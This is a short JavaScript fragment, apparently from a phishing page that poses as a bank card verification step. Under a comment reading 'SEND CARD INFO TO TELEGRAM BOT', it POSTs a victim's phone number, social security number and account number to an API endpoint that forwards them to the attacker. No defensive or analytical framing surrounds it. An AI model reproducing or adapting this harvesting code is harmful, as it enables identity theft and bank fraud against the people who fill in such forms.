      // === SEND CARD INFO TO TELEGRAM BOT ===
      fetch('/api/send-message', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phone,
          ssn,
          accountNumber,
          type: 'verify_card_info',
          page: 'verify-card',
        }),
      });
      // =======================================
